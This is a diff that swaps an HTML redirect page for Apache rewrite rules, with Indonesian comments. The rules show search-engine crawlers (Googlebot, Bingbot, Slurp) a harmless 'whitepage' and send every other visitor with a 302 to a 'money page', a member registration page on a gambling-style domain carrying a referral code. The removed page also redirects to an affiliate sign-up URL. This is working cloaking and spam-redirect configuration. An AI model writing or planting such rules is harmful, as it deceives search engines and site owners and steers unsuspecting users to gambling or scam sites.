@@ -1,15 +1,10 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8" />
-  <meta http-equiv="refresh" content="0; url=https://tujuan-redirect.com/" />
-  <script>
-    // Fallback untuk browser yang memblokir meta refresh
-    window.location.href = "https://agenlaris.vip/account/register/214666707";
-  </script>
-  <title>Redirecting...</title>
-</head>
-<body>
-  <p>Mengarahkan ke halaman baru...</p>
-</body>
-</html>
+RewriteEngine On
+
+# Kalau bot (Google, Bing, dll) => tampilkan whitepage
+RewriteCond %{HTTP_USER_AGENT} googlebot [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} bingbot [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} slurp [NC]
+RewriteRule ^.*$ whitepage.html [L]
+
+# Kalau bukan bot => redirect ke money page
+RewriteRule ^.*$ https://cantonatotoamlapura.com/mobile/member/daftar.html?ref=gadss1 [R=302,L]
